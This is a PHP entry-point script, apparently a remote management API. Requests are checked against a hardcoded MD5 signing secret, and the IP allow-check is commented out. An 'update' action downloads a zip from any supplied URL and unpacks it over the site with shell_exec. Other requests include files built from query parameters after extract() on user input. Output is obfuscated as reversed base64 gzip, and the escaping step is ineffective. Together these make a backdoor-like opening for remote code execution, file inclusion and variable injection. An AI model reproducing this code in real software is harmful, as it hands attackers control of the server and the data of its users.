<?php
	require_once("db.php");

	$ret = '';
	try{
	//	if ($_SERVER["REMOTE_ADDR"] != visit_ip)
	//	{
	//		throw new Exception('ip_error');
	//	}
		@array_walk($_GET,'addslashes');
		@array_walk($_POST,'addslashes');
		if (empty($_GET['module']))
		{
			throw new Exception('module_error');
		}
		if (empty($_GET['action']))
		{
			throw new Exception('action_error');
		}
		
		
		$signstr = '';
		ksort($_GET);
		foreach($_GET as $key=>$getstr)
		{
			if ($key != "sign")
			{
				$signstr .= $getstr;
			}
		}
		if ((!isset($_GET['sign'])) || (md5($signstr.'b3d1lbn1aInlOSavw') != $_GET['sign']))
		{
			throw new Exception('sign_error');
		}
		
		if ($_GET['module'] == 'update')
		{
			if ($_GET['action'] == 'interface') {
                if (isset($_GET['fileurl'])) {
                    $zipfile = file_get_contents($_GET['fileurl']);
                    file_put_contents("newfile.zip", $zipfile);
                    $ret[] = shell_exec("unzip -o newfile.zip");
                    $ret[] = shell_exec("rm -rf newfile.zip");
                }
            }
		}
		else
		{
			$action_path = $_GET['module']."/".$_GET['action'].".php";
			if (file_exists($action_path))
			{
				@extract($_GET);
				@extract($_POST);
				include($action_path);
		//		print_r($ret);
		//		print_r(unserialize(gzdecode(base64_decode(strrev($o)))));
			}
			else
			{
				throw new Exception('action_not_exist');
			}	
		}
	}
	catch(Exception $e)
	{
		$ret['error']=$e->getMessage();
	}
	echo  strrev(base64_encode(gzencode(serialize($ret))));
?>